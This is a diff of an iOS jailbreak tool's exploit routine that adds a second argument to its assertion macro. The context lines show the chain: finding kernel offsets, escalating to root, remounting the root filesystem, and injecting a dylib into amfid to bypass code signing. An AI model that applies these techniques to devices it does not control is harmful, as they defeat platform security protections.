@@ -167,7 +167,7 @@ char *copyBootHash(void)
 const char *systemSnapshot()
 {
     char *BootHash = copyBootHash();
-    _assert(BootHash != NULL);
+    _assert(BootHash != NULL, nil);
     const char *SystemSnapshot = [[NSString stringWithFormat:@APPLESNAP @"%s", BootHash] UTF8String];
     free(BootHash);
     return SystemSnapshot;
@@ -212,10 +212,10 @@ int inject_library(pid_t pid, const char *path)
     ret = task_for_pid(mach_task_self(), pid, &task_port);
     if (!(MACH_PORT_VALID(task_port) && ret == KERN_SUCCESS))
         task_port = task_for_pid_workaround(pid);
-    _assert(MACH_PORT_VALID(task_port));
+    _assert(MACH_PORT_VALID(task_port), nil);
     call_remote(task_port, dlopen, 2, REMOTE_CSTRING(path), REMOTE_LITERAL(RTLD_NOW));
     uint64_t error = call_remote(task_port, dlerror, 0);
-    _assert(error == 0);
+    _assert(error == 0, nil);
     return 0;
 }
 
@@ -499,7 +499,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
 // https://stackoverflow.com/a/47195924
 char *readFile(char *filename) {
     FILE *f = fopen(filename, "rt");
-    _assert(f);
+    _assert(f, nil);
     fseek(f, 0, SEEK_END);
     long length = ftell(f);
     fseek(f, 0, SEEK_SET);
@@ -515,13 +515,13 @@ void blockDomainWithName(char *name) {
     char *newLine = NULL;
     FILE *f = NULL;
     hostsFile = readFile("/etc/hosts");
-    _assert(hostsFile != NULL);
+    _assert(hostsFile != NULL, nil);
     newLine = malloc(sizeof(char *) + (14 + sizeof(name)));
     bzero(newLine, sizeof(char *) + (14 + sizeof(name)));
     sprintf(newLine, "\n127.0.0.1 %s\n", name);
     if (strstr(hostsFile, newLine)) goto out;
     f = fopen("/etc/hosts", "a");
-    _assert(f != NULL);
+    _assert(f != NULL, nil);
     fprintf(f, "%s\n", newLine);
 out:
     if (hostsFile != NULL) free(hostsFile);
@@ -1008,7 +1008,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (2/48)", 0, 0);
         rv = init_kernel(kernel_base, NULL);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully initialized patchfinder64.");
     }
     
@@ -1019,43 +1019,43 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (3/48)", 0, 0);
         offsets.trust_chain = find_trustcache();
         LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
-        _assert(offsets.trust_chain);
+        _assert(offsets.trust_chain, nil);
         offsets.amficache = find_amficache();
         LOG("amficache: " ADDR "\n", offsets.amficache);
-        _assert(offsets.amficache);
+        _assert(offsets.amficache, nil);
         offsets.OSBoolean_True = find_OSBoolean_True();
         LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
-        _assert(offsets.OSBoolean_True);
+        _assert(offsets.OSBoolean_True, nil);
         offsets.OSBoolean_False = find_OSBoolean_False();
         LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
-        _assert(offsets.OSBoolean_False);
+        _assert(offsets.OSBoolean_False, nil);
         offsets.osunserializexml = find_osunserializexml();
         LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
-        _assert(offsets.osunserializexml);
+        _assert(offsets.osunserializexml, nil);
         offsets.smalloc = find_smalloc();
         LOG("smalloc: " ADDR "\n", offsets.smalloc);
-        _assert(offsets.smalloc);
+        _assert(offsets.smalloc, nil);
         offsets.allproc = find_allproc();
         LOG("allproc: " ADDR "\n", offsets.allproc);
-        _assert(offsets.allproc);
+        _assert(offsets.allproc, nil);
         offsets.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
         LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
-        _assert(offsets.add_x0_x0_0x40_ret);
+        _assert(offsets.add_x0_x0_0x40_ret, nil);
         offsets.rootvnode = find_rootvnode();
         LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
-        _assert(offsets.rootvnode);
+        _assert(offsets.rootvnode, nil);
         offsets.zone_map_ref = find_zone_map_ref();
         LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
-        _assert(offsets.zone_map_ref);
+        _assert(offsets.zone_map_ref, nil);
         offsets.vfs_context_current = find_vfs_context_current();
         LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
-        _assert(offsets.vfs_context_current);
+        _assert(offsets.vfs_context_current, nil);
         offsets.vnode_lookup = find_vnode_lookup();
         LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
-        _assert(offsets.vnode_lookup);
+        _assert(offsets.vnode_lookup, nil);
         offsets.vnode_put = find_vnode_put();
         LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
-        _assert(offsets.vnode_put);
+        _assert(offsets.vnode_put, nil);
         LOG("Successfully found offsets.");
     }
     
@@ -1075,7 +1075,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (5/48)", 0, 0);
         rv = initQiLin(tfp0, kernel_base);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully initialized QiLin.");
     }
     
@@ -1086,7 +1086,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (6/48)", 0, 0);
         rv = rootifyMe();
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully rootified myself.");
     }
     
@@ -1097,7 +1097,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (7/48)", 0, 0);
         rv = platformizeMe();
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully platformized myself.");
     }
     
@@ -1118,23 +1118,23 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (!access("/var/mobile/test.txt", F_OK)) {
             rv = unlink("/var/mobile/test.txt");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen("/var/mobile/test.txt", "w");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/var/mobile/test.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/var/mobile/test.txt", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = unlink("/var/mobile/test.txt");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully wrote a test file to UserFS.");
     }
     
@@ -1157,7 +1157,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (11/48)", 0, 0);
             rv = [[NSData dataWithContentsOfFile:@"/System/Library/Caches/apticket.der"] writeToFile:[NSString stringWithFormat:@"%@/Documents/apticket.der", NSHomeDirectory()] atomically:YES];
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 1);
+            _assert(rv == 1, nil);
             LOG("Successfully dumped APTicket.");
         }
     }
@@ -1169,7 +1169,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (12/48)", 0, 0);
         rv = unlocknvram();
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully unlocked nvram.");
     }
     
@@ -1183,10 +1183,10 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (overwrite_boot_nonce || rv == 512) {
             rv = execCommandAndWait("/usr/sbin/nvram", strdup([[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String]), NULL, NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = execCommandAndWait("/usr/sbin/nvram", "IONVRAM-FORCESYNCNOW-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         LOG("Successfully set boot-nonce.");
     }
@@ -1198,7 +1198,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (14/48)", 0, 0);
         rv = locknvram();
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully locked nvram.");
     }
     
@@ -1218,7 +1218,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (16/48)", 0, 0);
         vfs_context = _vfs_context(offsets.vfs_context_current, offsets.zone_map_ref);
         LOG("vfs_context: " ADDR "\n", vfs_context);
-        _assert(vfs_context);
+        _assert(vfs_context, nil);
         LOG("Successfully got vfs_context.");
     }
     
@@ -1229,7 +1229,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (17/48)", 0, 0);
         devVnode = getVnodeAtPath(vfs_context, "/dev/disk0s1s1", offsets.vnode_lookup);
         LOG("devVnode: " ADDR "\n", devVnode);
-        _assert(devVnode);
+        _assert(devVnode, nil);
         LOG("Successfully got dev vnode.");
     }
     
@@ -1249,7 +1249,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (19/48)", 0, 0);
         rv = _vnode_put(offsets.vnode_put, devVnode);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully cleaned up dev vnode.");
     }
     
@@ -1269,25 +1269,25 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (21/48)", 0, 0);
         fd = open("/", O_RDONLY, 0);
         LOG("fd: " "%d" "\n", fd);
-        _assert(fd > 0);
+        _assert(fd > 0, nil);
         i = snapshot_list(fd);
         LOG("i: " "%d" "\n", i);
         rv = close(fd);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (i == -1) {
             if (!access("/var/tmp/rootfsmnt", F_OK)) {
                 rv = rmdir("/var/tmp/rootfsmnt");
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 0);
+                _assert(rv == 0, nil);
             }
             rv = mkdir("/var/tmp/rootfsmnt", 0755);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = spawnAndShaiHulud("/sbin/mount_apfs", "/dev/disk0s1s1", "/var/tmp/rootfsmnt", NULL, NULL, NULL);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             
             // Borrow entitlements from fsck_apfs.
             
@@ -1304,14 +1304,14 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (23/48)", 0, 0);
             fd = open("/var/tmp/rootfsmnt", O_RDONLY, 0);
             LOG("fd: " "%d" "\n", fd);
-            _assert(fd > 0);
+            _assert(fd > 0, nil);
             rv = fs_snapshot_rename(fd, systemSnapshot(), "orig-fs", 0);
-            _assert(errno == 2 || rv == 0);
+            _assert(errno == 2 || rv == 0, nil);
             rv = fs_snapshot_create(fd, "orig-fs", 0);
-            _assert(errno == 17 || rv == 0);
+            _assert(errno == 17 || rv == 0, nil);
             rv = close(fd);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully renamed system snapshot.");
             
             // Reboot.
@@ -1321,7 +1321,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             NOTICE("The device will be restarted.", 1);
             rv = reboot(0x400);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully rebooted.");
         }
         rootfs_vnode = rk64(offsets.rootvnode);
@@ -1333,7 +1333,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         dev_path = "/dev/disk0s1s1";
         rv = mount("apfs", "/", MNT_UPDATE, (void *)&dev_path);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         v_mount = rk64(rootfs_vnode + 0xd8);
         wk32(v_mount + 0x70, v_flag);
         LOG("Successfully remounted RootFS.");
@@ -1347,23 +1347,23 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (!access("/test.txt", F_OK)) {
             rv = unlink("/test.txt");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen("/test.txt", "w");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/test.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/test.txt", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = unlink("/test.txt");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully wrote a test file to RootFS.");
     }
     
@@ -1384,14 +1384,14 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             PROGRESS("Exploiting... (27/48)", 0, 0);
             fd = open("/", O_RDONLY, 0);
             LOG("fd: " "%d" "\n", fd);
-            _assert(fd > 0);
+            _assert(fd > 0, nil);
             rv = fs_snapshot_rename(fd, "electra-prejailbreak", systemSnapshot(), 0);
-            _assert(errno == 2 || rv == 0);
+            _assert(errno == 2 || rv == 0, nil);
             rv = fs_snapshot_rename(fd, "orig-fs", systemSnapshot(), 0);
-            _assert(errno == 17 || rv == 0);
+            _assert(errno == 17 || rv == 0, nil);
             rv = close(fd);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully renamed system snapshot back.");
             
             // Clean up UserFS.
@@ -1401,17 +1401,17 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             if (!access("/var/lib", F_OK)) {
                 rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/lib" error:nil];
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 1);
+                _assert(rv == 1, nil);
             }
             if (!access("/var/stash", F_OK)) {
                 rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/stash" error:nil];
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 1);
+                _assert(rv == 1, nil);
             }
             if (!access("/var/db/stash", F_OK)) {
                 rv = [[NSFileManager defaultManager] removeItemAtPath:@"/var/db/stash" error:nil];
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 1);
+                _assert(rv == 1, nil);
             }
             LOG("Successfully cleaned up UserFS.");
             
@@ -1420,12 +1420,12 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             LOG("Disallowing SpringBoard to show non-default system apps...");
             PROGRESS("Exploiting... (29/48)", 0, 0);
             md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-            _assert(md != nil);
+            _assert(md != nil, nil);
             if (![md[@"SBShowNonDefaultSystemApps"] isEqual:@(NO)]) {
                 md[@"SBShowNonDefaultSystemApps"] = @(NO);
                 rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                 LOG("rv: " "%d" "\n", rv);
-                _assert(rv == 1);
+                _assert(rv == 1, nil);
             }
             LOG("Successfully disallowed SpringBoard to show non-default system apps.");
             
@@ -1436,7 +1436,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             NOTICE("The device will be restarted.", 1);
             rv = reboot(0x400);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             LOG("Successfully rebooted.");
         }
     }
@@ -1449,211 +1449,211 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (access("/jb", F_OK)) {
             rv = mkdir("/jb", 0755);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
             rv = chown("/jb", 0, 0);
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         
         if (!access("/electra", F_OK)) {
             rv = [[NSFileManager defaultManager] removeItemAtPath:@"/electra" error:nil];
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 1);
+            _assert(rv == 1, nil);
         }
         rv = symlink("/jb", "/electra");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         rv = chdir("/jb");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/amfid_payload.dylib", F_OK)) {
             rv = unlink("/jb/amfid_payload.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"amfid_payload" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "amfid_payload");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/amfid_payload.dylib", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/amfid_payload.dylib", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/launchctl", F_OK)) {
             rv = unlink("/jb/launchctl");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"launchctl" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "launchctl");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/launchctl", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/launchctl", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/jailbreakd", F_OK)) {
             rv = unlink("/jb/jailbreakd");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"jailbreakd" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "jailbreakd");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/jailbreakd", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/jailbreakd", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/libjailbreak.dylib", F_OK)) {
             rv = unlink("/jb/libjailbreak.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"libjailbreak" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "libjailbreak");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/libjailbreak.dylib", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/libjailbreak.dylib", 501, 501);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/pspawn_hook.dylib", F_OK)) {
             rv = unlink("/jb/pspawn_hook.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"pspawn_hook" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "pspawn_hook");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/pspawn_hook.dylib", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/pspawn_hook.dylib", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/tar", F_OK)) {
             rv = unlink("/jb/tar");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"tar" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "tar");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/tar", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/tar", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/lzma", F_OK)) {
             rv = unlink("/jb/lzma");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"lzma" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "lzma");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/lzma", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/lzma", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/jb/spawn", F_OK)) {
             rv = unlink("/jb/spawn");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"spawn" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "spawn");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/spawn", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/spawn", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         
         if (!access("/var/tmp/strap.tar.lzma", F_OK)) {
             rv = unlink("/var/tmp/strap.tar.lzma");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = copyfile([[[NSBundle mainBundle] pathForResource:@"strap.tar" ofType:@"lzma"] UTF8String], "/var/tmp/strap.tar.lzma", 0, COPYFILE_ALL);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/var/tmp/strap.tar.lzma", 0644);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/var/tmp/strap.tar.lzma", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully copied over our resources to RootFS.");
         
         if (!access("/jb/debugserver", F_OK)) {
             rv = unlink("/jb/debugserver");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         a = fopen([[[NSBundle mainBundle] pathForResource:@"debugserver" ofType:@"tar"] UTF8String], "rb");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         untar(a, "debugserver");
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chmod("/jb/debugserver", 0755);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/jb/debugserver", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
     }
     
     {
@@ -1690,17 +1690,17 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (34/48)", 0, 0);
         a = fopen("/tmp/slide.txt", "w+");
         LOG("a: " "%p" "\n", a);
-        _assert(a != NULL);
+        _assert(a != NULL, nil);
         fprintf(a, ADDR "\n", kernel_base - KERNEL_SEARCH_ADDRESS);
         rv = chmod("/tmp/slide.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = chown("/tmp/slide.txt", 0, 0);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully logged slide.");
     }
     
@@ -1711,7 +1711,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         PROGRESS("Exploiting... (35/48)", 0, 0);
         rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully set HSP4.");
     }
     
@@ -1733,11 +1733,11 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (!access("/var/tmp/amfid_payload.alive", F_OK)) {
             rv = unlink("/var/tmp/amfid_payload.alive");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = inject_library(findPidOfProcess("amfid"), "/jb/amfid_payload.dylib");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         rv = access("/var/tmp/amfid_payload.alive", F_OK);
         LOG("rv: " "%d" "\n", rv);
         for (i = 0; !(i >= 20 || rv == 0); i++) {
@@ -1746,7 +1746,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = access("/var/tmp/amfid_payload.alive", F_OK);
             LOG("rv: " "%d" "\n", rv);
         }
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         LOG("Successfully patched amfid.");
     }
     
@@ -1758,23 +1758,23 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         if (!access("/usr/lib/libjailbreak.dylib", F_OK)) {
             rv = unlink("/usr/lib/libjailbreak.dylib");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = symlink("/jb/libjailbreak.dylib", "/usr/lib/libjailbreak.dylib");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         if (!access("/bin/launchctl", F_OK)) {
             rv = unlink("/bin/launchctl");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         rv = rename("/jb/launchctl", "/bin/launchctl");
         LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
+        _assert(rv == 0, nil);
         if (!access("/jb/jailbreakd.plist", F_OK)) {
             rv = unlink("/jb/jailbreakd.plist");
             LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            _assert(rv == 0, nil);
         }
         md = [[NSMutableDictionary alloc] init];
         md[@"Label"] = @"jailbreakd";
@@ -1798,25 +1798,25 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         md[@"StandardOutPath"] = @"/var/log/jailbreakd-stdout.log";
